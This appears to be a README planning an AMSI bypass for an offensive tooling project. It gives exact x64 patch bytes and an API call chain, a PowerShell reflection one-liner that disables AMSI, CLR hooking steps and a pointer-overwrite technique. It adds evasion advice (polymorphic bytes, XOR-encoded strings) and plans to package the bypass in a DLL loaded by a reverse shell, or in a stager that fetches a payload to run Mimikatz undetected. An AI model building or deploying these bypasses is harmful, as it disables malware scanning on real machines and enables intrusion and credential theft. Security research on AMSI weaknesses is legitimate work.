# PHASE 1 — AMSI BYPASS (Dark Room Entry)

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY
## Status: ACTIVE — First engagement target

---

## Objective

Bypass AMSI (Antimalware Scan Interface) from standard user context.
Run arbitrary PowerShell/scripts without Defender seeing the content.
This creates the "dark room" where our other tools operate undetected.

## How AMSI Works

AMSI is an in-process DLL (`amsi.dll`) loaded into every process that
uses scripting: PowerShell, .NET CLR, VBScript/JScript, Office VBA.

The critical function:
```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,    // AMSI context handle
    PVOID        buffer,         // Script content to scan
    ULONG        length,         // Buffer length
    LPCWSTR      contentName,    // Content identifier
    HAMSISESSION amsiSession,    // Session handle (optional)
    AMSI_RESULT  *result         // OUT: scan verdict
);
```

Returns `S_OK` (0) on success. Scan verdict goes into `result`:
- `AMSI_RESULT_CLEAN` (0) — clean
- `AMSI_RESULT_NOT_DETECTED` (1) — not detected
- `AMSI_RESULT_DETECTED` (0x8000) — malware detected

Consumer code calls `AmsiResultIsMalware()` which returns true if `result >= 0x8000`.

**The fundamental weakness:** AMSI runs at the SAME privilege level as the code
it scans. It's an in-process DLL in YOUR process. You own the memory. You can
patch it. Microsoft has not moved to kernel-level or out-of-process scanning.

From vader-toctou Finding #20: security checks fire at specific moments, not
continuously. AMSI checks fire when `AmsiScanBuffer` is called. If we patch
the function before the call, the check never fires. Same principle.

## Attack Vector 1: Memory Patch (Classic)

Overwrite first bytes of `AmsiScanBuffer` to return immediately without scanning.

**x64 patch bytes (6 bytes):**
```
0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
```
Assembly: `mov eax, 0x80070057` (E_INVALIDARG) / `ret`

When AmsiScanBuffer returns a failure HRESULT, the caller treats it as
"scan failed, not malicious" — effectively a clean pass.

**API chain:**
```
LoadLibraryA("amsi.dll")
    → GetProcAddress(hAmsi, "AmsiScanBuffer")
        → VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &oldProtect)
            → memcpy(addr, patch, 6)
                → VirtualProtect(addr, 6, oldProtect, &dummy)
```

**Standard user:** YES. VirtualProtect on your own process memory requires
no elevation. Each PowerShell instance loads its own copy of amsi.dll.
You patch only your copy. No cross-process writes.

**Defender detection:** YES — Defender signatures match the specific byte
patterns `{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}` written to amsi.dll's
memory region. Content-matching, not access-control.

**Evasion:** Runtime-generated polymorphic patch bytes. Vary each execution.
Insert NOPs/garbage between functional opcodes. Static patterns get signatured
within hours of publication.

## Attack Vector 2: amsiInitFailed Reflection

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)
```

Sets internal flag so PowerShell skips AMSI entirely. The raw one-liner
is heavily signatured — requires string obfuscation/fragmentation to deploy.
Conceptually still works.

## Attack Vector 3: CLR Hooking (ScanContent Method)

Instead of patching native amsi.dll, hook `AmsiUtils.ScanContent()` in
`System.Management.Automation.dll` (managed code):

1. Reflection to find original + replacement method handles
2. `RuntimeHelpers.PrepareMethod()` forces JIT compilation
3. `GetFunctionPointer()` gets native addresses
4. VirtualProtect + write to overwrite managed method entry with JMP stub
5. `FlushInstructionCache()` to clear CPU cache

Advantage: avoids touching amsi.dll directly, bypasses EDR rules monitoring
native AMSI modifications.

## Attack Vector 4: AMSI Write Raid (0day — OffSec, April 2024)

`System.Management.Automation.dll` has a writable memory entry holding the
`AmsiScanBuffer` function pointer. The JIT compiler writes this address during
`ThePreStub` execution but NEVER marks the page read-only afterward.

Replace the pointer with a dummy function — **no VirtualProtect call needed.**
Works on PowerShell 5.1 and 7.4. Reported to MSRC April 2024.

This is the most interesting vector because it requires NO memory protection
manipulation. If still unpatched on Windows 11 24H2, it's our cleanest path.

## Implementation Plan

### Phase 1a — Validate Write Raid
1. Check if the writable function pointer still exists on Win11 Build 26200
2. If yes: build PoC that replaces pointer with dummy (no VirtualProtect)
3. Test: can we run Invoke-Mimikatz string without detection?

### Phase 1b — Classic Patch with Polymorphism
1. Build C loader that generates randomized patch bytes at runtime
2. Functional opcodes (mov eax, ret) interleaved with random garbage
3. XOR-encode the loader binary itself (using evasion/xor.h)
4. Test against live Defender

### Phase 1c — Integration
1. Package as a DLL that auto-patches AMSI on DLL_PROCESS_ATTACH
2. Loadable by the reverse shell after connection established
3. Or: compile into stager that patches AMSI before downloading full payload

## XOR-Encoded Strings (using shared key 0x41)

```
"amsi.dll"          → { 0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D }
"AmsiScanBuffer"    → { 0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2F,
                         0x01, 0x34, 0x27, 0x27, 0x24, 0x33 }
"VirtualProtect"    → { 0x17, 0x28, 0x33, 0x35, 0x34, 0x20, 0x2D, 0x11,
                         0x33, 0x2E, 0x35, 0x24, 0x22, 0x35 }
```

## Files (when built)

```
amsi/
+-- amsi_bypass_annotated.c    # Annotated PoC — full educational commentary
+-- amsi_bypass.c              # Clean deployment variant
+-- amsi_check.ps1             # Test if AMSI is active/patched
+-- write_raid_check.c         # Validate Write Raid still works on target
+-- README.md                  # This file
```

## References

- Microsoft AMSI docs: learn.microsoft.com/en-us/windows/win32/amsi
- rasta-mouse AmsiScanBufferBypass (original technique)
- OffSec AMSI Write Raid 0day (April 2024)
- CyberArk AMSI bypass research
- vader-toctou Finding #20 (timing-based check bypass pattern)
